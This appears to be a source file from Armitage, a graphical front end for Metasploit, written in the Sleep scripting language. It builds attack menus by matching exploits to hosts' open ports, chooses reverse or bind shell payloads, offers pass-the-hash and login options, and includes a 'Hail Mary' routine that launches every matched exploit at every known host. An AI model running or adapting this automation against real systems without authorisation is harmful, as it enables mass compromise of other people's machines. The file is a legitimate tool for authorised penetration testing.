#
# Code to create the various attack menus based on db_autopwn
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;

import ui.*;

global('%results @always_reverse %exploits %results2');
%results = ohash();
%results2 = ohash();
setMissPolicy(%results, { return @(); });
setMissPolicy(%results2, { return @(); });

# %exploits is populated in menus.sl when the client-side attacks menu is constructed

# a list of exploits that should always use a reverse shell... this list needs to grow.
@always_reverse = @("multi/samba/usermap_script", "unix/misc/distcc_exec", "windows/http/xampp_webdav_upload_php", "windows/postgres/postgres_payload", "linux/postgres/postgres_payload");

#
# generate menus for a given OS
#
sub exploit_menus {
	local('%toplevel @allowed $ex $os $port $exploit');
	%toplevel = ohash();
	@allowed = getOS($1);

	foreach $ex ($2) {
		($os, $port, $exploit) = split('/', $ex);
		if ($os in @allowed) {
			if ($port !in %toplevel) {
				%toplevel[$port] = %();
			}
			%toplevel[$port][$exploit] = $ex;
		}
	}

	local('%r $menu $exploits $name $exploit');

	%r = ohash();
	putAll(%r, sorta(keys(%toplevel)), { return 1; });
	foreach $menu => $exploits (%r) {
		$exploits = ohash();
		foreach $name (sorta(keys(%toplevel[$menu]))) {
			$exploits[$name] = %toplevel[$menu][$name];
		}
	}

	return %r;
}

sub targetsCombobox {
	local('$key $value @targets $combobox');
	foreach $key => $value ($1["targets"]) {
		if (strlen($value) > 53) {
			push(@targets, "$key => " . substr($value, 0, 50) . "...");
		}
		else {
			push(@targets, "$key => $value");
		}
	}

	$combobox = [new JComboBox: sort({
		local('$a $b');
		$a = int(split(' \=\> ', $1)[0]);
		$b = int(split(' \=\> ', $2)[0]);
		return $a <=> $b;
	}, @targets)];

	return $combobox;
}

sub getOS {
	local('@allowed $os');
	$os = normalize($1);

	if ($os eq "Windows") { @allowed = @("windows", "multi"); }
	else if ($os eq "Solaris") { @allowed = @("solaris", "multi", "unix"); }
	else if ($os eq "Linux") { @allowed = @("linux", "multi", "unix"); }
	else if ($os eq "Mac OS X") { @allowed = @("osx", "multi", "unix"); }
	else if ($os eq "FreeBSD") { @allowed = @("freebsd", "multi", "unix"); }
	else { @allowed = @("multi", "unix"); }
	return @allowed;
}

# findAttacks("p", "good|great|excellent", &callback) - port analysis 
# findAttacks("x", "good|great|excellent", &callback) - vulnerability analysis
sub resolveAttacks {
	thread(lambda(&_resolveAttacks, $args => @_));
}

sub _resolveAttacks {
	# force a service data refresh before hail mary or find attacks.
	_refreshServices(call($mclient, "db.services")['services']);

	%results = ohash();
	%results2 = ohash();
	setMissPolicy(%results, { return @(); });
	setMissPolicy(%results2, { return @(); });

	local('%r $r $p $module $s');
	%r = ohash();
	setMissPolicy(%r, { return @(); });

	#
	# find all exploits and their associated ports
	#
	
	$s = rankScore($args[1]);
	foreach $module (@exploits) {
		if (%exploits[$module]["rankScore"] >= $s) { 
			$r = call($client, "module.options", "exploit", $module);
			yield 2;
			if ("RPORT" in $r && "default" in $r["RPORT"]) {
				$p = $r["RPORT"]["default"];
				push(%r[$p], $module);

				if ($p eq "445") {
					push(%r["139"], $module);
				}
				else if ($p eq "139") {
					push(%r["139"], $module);
				}
				else if ($p eq "80") {
					push(%r["443"], $module);
				}
				else if ($p eq "443") {
					push(%r["80"], $module);
				}
			}
		}
	}

	#
	# for each host, see if there is an exploit associated with its port and if so, report it...
	#

	local('$port $modules $host $data $services $exploit');

	foreach $port => $modules (%r) {
		foreach $host => $data (%hosts) {
			$services = $data["services"];
			if ($port in $services) {
				foreach $exploit ($modules) {
					push(%results[$host], $exploit);
					push(%results2[$host], @($exploit, $port));
				}
			}
		}
	}

	[$args[2]];
}

sub findAttacks {
	resolveAttacks($1, $2, {
		showError("Attack Analysis Complete...\n\nYou will now see an 'Attack' menu attached\nto each host in the Targets window.\n\nHappy hunting!");
	});
}

sub smarter_autopwn {
	local('$console');
	elog("has given up and launched the hail mary!");

	$console = createDisplayTab("Hail Mary", 1, $host => "all", $file => "hailmary");
	[[$console getWindow] append: "\n\n1) Finding exploits (via local magic)\n\n"];

	resolveAttacks($1, $2, lambda({
		# now crawl through %results and start hacking each host in turn
		local('$host $exploits @allowed $ex $os $port $exploit @attacks %dupes $e $p');

		# filter the attacks...
		foreach $host => $exploits (%results2) {
			%dupes = %();
			@allowed = getOS(getHostOS($host));

			foreach $e ($exploits) {
				($ex, $p) = $e;
				($os, $port, $exploit) = split('/', $ex);
				if ($os in @allowed && $ex !in %dupes) {
					push(@attacks, @("$host", "$ex", best_payload($host, $ex, iff($ex in @always_reverse)), $p, %exploits[$ex]));
					if ($p eq "139") {
						push(@attacks, @("$host", "$ex", best_payload($host, $ex, iff($ex in @always_reverse)), 445, %exploits[$ex]));
					}
					%dupes[$ex] = 1;
				}
			}
			[[$console getWindow] append: "\t[ $+ $host $+ ] Found " . size($exploits) . " exploits\n" ];
		}

		[[$console getWindow] append: "\n2) Sorting Exploits\n"];

		# now sort them, so the best ones are on top...
		sort({
			local('$a $b');
			if ($1[1] !in %exploits) {
				return 1;
			}
			if ($2[1] !in %exploits) {
				return -1;
			}

			$a = %exploits[$1[1]];
			$b = %exploits[$2[1]];

			if ($a['rankScore'] eq $b['rankScore']) {
				return $b['date'] <=> $a['date'];
			}

			return $b['rankScore'] <=> $a['rankScore'];
		}, @attacks);

		[[$console getWindow] append: "\n3) Launching Exploits\n\n"];

		# now execute them...
		local('$progress');
		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];

		thread(lambda({
			local('$host $ex $payload $x $rport %wait $options');
			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
				($host, $ex, $payload, $rport) = @attacks[0];

				# let's throttle our exploit/host velocity a little bit.
				if ((ticks() - %wait[$host]) > 1250) {
					yield 250;
				}
				else {
					yield 1500;
				}

				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
				[$progress setProgress: $x + 0];

				$options = %(PAYLOAD => $payload, RHOST => $host, LHOST => $MY_ADDRESS, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1'));
				($ex, $host, $options) = filter_data("exploit", $ex, $host, $options);
				call_async($client, "module.execute", "exploit", $ex, $options);
				%wait[$host] = ticks();
				$x++; 
				@attacks = sublist(@attacks, 1);
			}
			[$progress close];

			[[$console getWindow] append: "\n\n4) Listing sessions\n\n"];

			[$console addCommand: $null, "sessions -v"];
			[$console start];
			[$console stop];
		}, \@attacks, \$progress, \$console));
	}, \$console));
}

# choose a payload...
# best_client_payload(exploit, target) 
sub best_client_payload {
	local('$os');
	$os = split('/', $1)[0];

	if ($os eq "windows" || "*Windows*" iswm $2) {
		return "windows/meterpreter/reverse_tcp";
	}
	else if ("*Generic*Java*" iswm $2) {
		return "java/meterpreter/reverse_tcp";
	}
	else if ("*Mac*OS*PPC*" iswm $2 || ($os eq "osx" && "*PPC*" iswm $2)) {
		return "osx/ppc/shell/reverse_tcp";
	}
	else if ("*Mac*OS*x86*" iswm $2 || "*Mac*OS*" iswm $2 || "*OS X*" iswm $2 || $os eq "osx") {
		return "osx/x86/vforkshell/reverse_tcp";
	}
	else {
		return "generic/shell_reverse_tcp";
	}
}

sub isIPv6 {
	local('$inet $exception');
	try {
		$inet = [java.net.InetAddress getByName: $1];
		if ($inet isa ^java.net.Inet6Address) {
			return 1;
		}
	}
	catch $exception { }
	return $null;
}

# choose a payload...
# best_payload(host, exploit, reverse preference)
sub best_payload {
	local('$compatible $os $win');
	$compatible = call($client, "module.compatible_payloads", $2)["payloads"];
	$os = iff($1 in %hosts, %hosts[$1]['os_name']);
	$win = iff($os eq "Windows" || "windows" isin $2);

	if ($3) {
		if ($win && "windows/meterpreter/reverse_tcp" in $compatible) {
			return "windows/meterpreter/reverse_tcp";
		}
		else if ($win && "windows/shell/reverse_tcp" in $compatible) {
			return "windows/shell/reverse_tcp";
		}
		else if ("java/meterpreter/reverse_tcp" in $compatible) {
			return "java/meterpreter/reverse_tcp";
		}
		else if ("java/shell/reverse_tcp" in $compatible) {
			return "java/shell/reverse_tcp";
		}
		else if ("java/jsp_shell_reverse_tcp" in $compatible) {
			return "java/jsp_shell_reverse_tcp";
		}
		else if ("php/meterpreter_reverse_tcp" in $compatible) {
			return "php/meterpreter_reverse_tcp";
		}
		else {
			return "generic/shell_reverse_tcp";
		}
	}
	
	if ($win && "windows/meterpreter/bind_tcp" in $compatible) {
		if (isIPv6($1)) {
			return "windows/meterpreter/bind_ipv6_tcp";
		}
		else {
			return "windows/meterpreter/bind_tcp";
		}
	}
	else if ($win && "windows/shell/bind_tcp" in $compatible) {
		if (isIPv6($1)) {
			return "windows/shell/bind_ipv6_tcp";
		}
		else {
			return "windows/shell/bind_tcp";
		}
	}
	else if ("java/meterpreter/bind_tcp" in $compatible) {
		return "java/meterpreter/bind_tcp";
	}
	else if ("java/shell/bind_tcp" in $compatible) {
		return "java/shell/bind_tcp";
	}
	else if ("java/jsp_shell_bind_tcp" in $compatible) {
		return "java/jsp_shell_bind_tcp";
	}
	else if ("cmd/unix/interact" in $compatible) {
		return "cmd/unix/interact";
	}
	else {
		return "generic/shell_bind_tcp";
	}
}

sub addAdvanced {
	local('$d');
	$d = [new JCheckBox: " Show advanced options"];
	[$d addActionListener: lambda({
		[$model showHidden: [$d isSelected]];
		[$model fireListeners];
	}, \$model, \$d)];
	return $d;
}

#
# pop up a dialog to start our attack with... fun fun fun
#
sub attack_dialog {
	local('$dialog $north $center $south $center @targets $combobox $label $textarea $scroll $model $key $table $sorter $col $d $b $c $button $x $value');

	$dialog = dialog("Attack " . join(', ', $3), 590, 360);

	$north = [new JPanel];
	[$north setLayout: [new BorderLayout]];
	
	$label = [new JLabel: $1["name"]];
	[$label setBorder: [BorderFactory createEmptyBorder: 5, 5, 5, 5]];

	[$north add: $label, [BorderLayout NORTH]];

	$textarea = [new JTextArea: [join(" ", split('[\\n\\s]+', $1["description"])) trim]];
	[$textarea setEditable: 0];
	[$textarea setOpaque: 1];
	[$textarea setLineWrap: 1];
	[$textarea setWrapStyleWord: 1];
	[$textarea setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	$scroll = [new JScrollPane: $textarea];
	[$scroll setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];

	[$north add: $scroll, [BorderLayout CENTER]];

	$model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
	[$model setCellEditable: 1];
	foreach $key => $value ($2) {	
		if ($key eq "RHOST") {
			$value["default"] = join(", ", $3);
		}
		else if ($key eq "RHOSTS") {
			$value["default"] = join(", ", $3);
		}
		
		[$model _addEntry: %(Option => $key, 
					Value => $value["default"], 
					Tooltip => $value["desc"], 
					Hide => 
						iff($value["advanced"] eq '0' && $value["evasion"] eq '0', '0', '1')
				)
		]; 
	}
	[$model _addEntry: %(Option => "LHOST", Value => $MY_ADDRESS, Tooltip => "Address (for connect backs)", Hide => '0')];
	[$model _addEntry: %(Option => "LPORT", Value => randomPort(), Tooltip => "Bind meterpreter to this port", Hide => '0')];

	$table = [new ATable: $model];
	$sorter = [new TableRowSorter: $model];
        [$sorter toggleSortOrder: 0];
	[$table setRowSorter: $sorter];
	addFileListener($table, $model);

	local('$TABLE_RENDERER');
	$TABLE_RENDERER = tableRenderer($table, $model);

	foreach $col (@("Option", "Value")) {
		[[$table getColumn: $col] setCellRenderer: $TABLE_RENDERER];
	}

	$center = [new JScrollPane: $table];
	
	$south = [new JPanel];
	[$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
	#[$south setLayout: [new GridLayout: 4, 1]];
	
	$d = addAdvanced(\$model);

	$combobox = targetsCombobox($1);

	$b = [new JCheckBox: " Use a reverse connection"];

	if ($4 in @always_reverse) {
		[$b setSelected: 1];
	}

	$c = [new JPanel];
	[$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];

	$button = [new JButton: "Launch"];
	[$button addActionListener: lambda({
		local('$options $host $x');
		syncTable($table);

		$options = %();
	
		for ($x = 0; $x < [$model getRowCount]; $x++) {
			$options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
		}

		$options["TARGET"] = split(' \=\> ', [$combobox getSelectedItem])[0];

		if ('RHOSTS' in $options) {
			thread(lambda({
				local('$hosts $host');
				$hosts = split(', ', $options["RHOSTS"]);

				if (size($hosts) == 0) {
					showError("Please specify an RHOSTS value");
					return;
				}
				$options["PAYLOAD"] = best_payload($hosts[0], $exploit, [$b isSelected]);

				if ([$b isSelected]) {
					$options["LPORT"] = randomPort();
				}

				# give scripts a chance to filter this data.
				foreach $host ($hosts) {
					($exploit, $host, $options) = filter_data("exploit", $exploit, $host, $options);
				}
	
				module_execute("exploit", $exploit, copy($options));

				if ([$preferences getProperty: "armitage.show_all_commands.boolean", "true"] eq "false" || size($hosts) >= 4) {
					showError("Launched $exploit at " . size($hosts) . " host" . iff(size($hosts) == 1, "", "s"));
				}
			}, $options => copy($options), \$exploit, \$b));
		}
		else {
			thread(lambda({
				local('$host $hosts');
				$hosts = split(', ', $options["RHOST"]);

				foreach $host ($hosts) {
					$options["PAYLOAD"] = best_payload($host, $exploit, [$b isSelected]);
					$options["RHOST"] = $host;
					if ([$b isSelected]) {
						$options["LPORT"] = randomPort();
					}

					($exploit, $host, $options) = filter_data("exploit", $exploit, $host, $options);
	
					if (size($hosts) >= 4) {
						call_async($client, "module.execute", "exploit", $exploit, $options);
					}
					else {
						module_execute("exploit", $exploit, copy($options));
					}
					yield 100;
				}

				if ([$preferences getProperty: "armitage.show_all_commands.boolean", "true"] eq "false" || size($hosts) >= 4) {
					showError("Launched $exploit at " . size($hosts) . " host" . iff(size($hosts) == 1, "", "s"));
				}
			}, $options => copy($options), \$exploit, \$b));
		}

		if (!isShift($1)) {
			[$dialog setVisible: 0];
		}

		elog("exploit $exploit @ " . $options["RHOST"]);
	}, $exploit => $4, \$model, \$combobox, \$dialog, \$b, \$table)];

	[$c add: $button];

	[$south add: left([new JLabel: "Targets: "], $combobox)];
	[$south add: left($b)];
	[$south add: left($d)];
	[$south add: $c];

	#[$dialog add: $north, [BorderLayout NORTH]];
	local('$s');
	$s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
	[$center setPreferredSize: [new Dimension: 0, 0]];
	[$north setPreferredSize: [new Dimension: 480, 76]];
	[$s resetToPreferredSizes];
	[$s setOneTouchExpandable: 1];

	[$dialog add: $s, [BorderLayout CENTER]];	
	[$dialog add: $south, [BorderLayout SOUTH]];

	[$button requestFocus];

	[$dialog setVisible: 1];
}

sub min_rank {
	return [$preferences getProperty: "armitage.required_exploit_rank.string", "great"];
}

sub host_attack_items {
	local('%m');

	# we're going to take the OS of the first host...
	%m = exploit_menus(%hosts[$2[0]]['os_name'], %results[$2[0]]);

	if (size(%m) > 0) {
		local('$a $service $exploits $e $name $exploit');

		$a = menu($1, "Attack", 'A');

		foreach $service => $exploits (%m) {
			$e = menu($a, $service, $null);
			foreach $name => $exploit  ($exploits) {
				item($e, $name, $null, lambda({
					thread(lambda({ 
						local('$a $b'); 
						$a = call($mclient, "module.info", "exploit", $exploit);
						$b = call($mclient, "module.options", "exploit", $exploit);
						attack_dialog($a, $b, $hosts, $exploit);
					}, \$exploit, \$hosts));
				}, \$exploit, $hosts => $2));
			}
	
			if ($service eq "smb") {
				item($e, "pass the hash...", 'p', lambda(&pass_the_hash, $hosts => $2));
			}

			if (size($exploits) > 0) {
				separator($e);
				item($e, "check exploits...", 'c', lambda({
					local('$result $h $console');
					$console = createDisplayTab("Check Exploits", 1);
		
					$h = $hosts[0];
					foreach $result (values($exploits)) {
						[$console addCommand: $null, "ECHO \n\n===== Checking $result =====\n\n"];
						[$console addCommand: $null, "use $result"];
						[$console addCommand: $null, "set RHOST $h"];
						[$console addCommand: $null, "check"];
					}

					[$console start];
					[$console stop];
				}, $hosts => $2, \$exploits));
			}
		}
	}

	local('$name %options $a $port $host $service');
	%options = ohash();

	foreach $host ($2) {
		foreach $port => $service (%hosts[$host]['services']) {
			$name = $service['name'];
			if ($port == 445 && "*Windows*" iswm getHostOS($host)) {
				%options["psexec"] = lambda(&pass_the_hash, $hosts => $2);
			}
			else if ("scanner/ $+ $name $+ / $+ $name $+ _login" in @auxiliary) {
				%options[$name] = lambda(&show_login_dialog, \$service, $hosts => $2);
			}
			else if ($name eq "microsoft-ds") {
				%options["psexec"] = lambda(&pass_the_hash, $hosts => $2);
			}
		}
	}

	if (size(%options) > 0) {
		$a = menu($1, 'Login', 'L');
		foreach $name (sorta(keys(%options))) {
			item($a, $name, $null, %options[$name]);
		}
	}
}

sub chooseSession {
	local('@data $sid $data $host $hdata $temp $tablef');

	# obtain a list of sessions
	foreach $host (keys(%hosts)) {
		foreach $sid => $data (getSessions($host)) {
			$temp = copy($data);
			$temp['sid'] = $sid;
			push(@data, $temp);
		}
	}

	# sort the session data
	@data = sort({ return $1['sid'] <=> $2['sid']; }, @data);

	# update the table widths
	$tablef = {
       	        [[$1 getColumn: "sid"] setPreferredWidth: 100];
       	        [[$1 getColumn: "session_host"] setPreferredWidth: 300];
       	        [[$1 getColumn: "info"] setPreferredWidth: 1024];
	};

	# let the user choose a session
	quickListDialog("Choose a session", "Select", @("sid", "sid", "session_host", "info"), @data, $width => 640, $height => 240, lambda({
		[$call : $1];
	}, $call => $4), \$tablef);
}

sub addFileListener {
	local('$table $model $actions');
	($table, $model, $actions) = @_; 

	if ($actions is $null) {
		$actions = %();
	}

	# set up an action to pop up a file chooser for different file type values.
	$actions["*FILE*"] = {
		local('$title $temp');
		$title = "Select $1";
		$temp = iff($2 eq "", 
				chooseFile(\$title, $dir => $DATA_DIRECTORY), 
				chooseFile(\$title, $sel => $2)
			);
		if ($temp !is $null) {
			[$4: strrep($temp, "\\", "\\\\")];
		}
	};
	$actions["NAMELIST"] = $actions["*FILE*"];
	$actions["DICTIONARY"] = $actions["*FILE*"];
	$actions["Template"] = $actions["*FILE*"];
	$actions["SigningCert"] = $actions["*FILE*"];
	$actions["SigningKey"] = $actions["*FILE*"];
	$actions["Wordlist"]   = $actions["*FILE*"];
	$actions["EXE::Custom"] = $actions["*FILE*"];
	$actions["EXE::Template"] = $actions["*FILE*"];
	$actions["WORDLIST"]   = $actions["*FILE*"];
	$actions["REXE"]   = $actions["*FILE*"];

	# set up an action to choose a session
	$actions["SESSION"] = lambda(&chooseSession);

	# helpers to set credential pairs from database... yay?
	$actions["USERNAME"] = lambda(&credentialHelper, \$model, $USER => "USERNAME", $PASS => "PASSWORD");
	$actions["PASSWORD"] = lambda(&credentialHelper, \$model, $USER => "USERNAME", $PASS => "PASSWORD");
	$actions["SMBUser"] = lambda(&credentialHelper, \$model,  $USER => "SMBUser", $PASS => "SMBPass");
	$actions["SMBPass"] = lambda(&credentialHelper, \$model,  $USER => "SMBUser", $PASS => "SMBPass");

	# set up an action to pop up a file chooser for different file type values.
	$actions["RHOST"] = {
		local('$title $temp');
		$title = "Select $1";
		$temp = chooseFile(\$title, $dir => ".", $always => "1");
		if ($temp !is $null) {
			local('$handle');
			$handle = openf($temp);
			@addresses = readAll($handle);	
			closef($handle);

			[$4: join(", ", @addresses)];
		}
	};

	$actions["RHOSTS"] = $actions["RHOST"];
     
	addMouseListener($table, lambda({
                if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
			local('$type $row $action $change $value');

			$value = [$model getSelectedValueFromColumn: $table, "Value"];
			$type = [$model getSelectedValueFromColumn: $table, "Option"];
			$row = [$model getSelectedRow: $table];

			foreach $action => $change ($actions) {
				if ($action iswm $type) {
					[$change: $type, $value, $row, lambda({;
						[$model setValueAtRow: $row, "Value", "$1"];
						[$model fireListeners];
					}, \$model, \$row)];
				}
			}
		}
	}, \$model, \$table, \$actions));
}

sub rankScore {
	return %(normal => 1, good => 2, great => 3, excellent => 4)[$1];
}
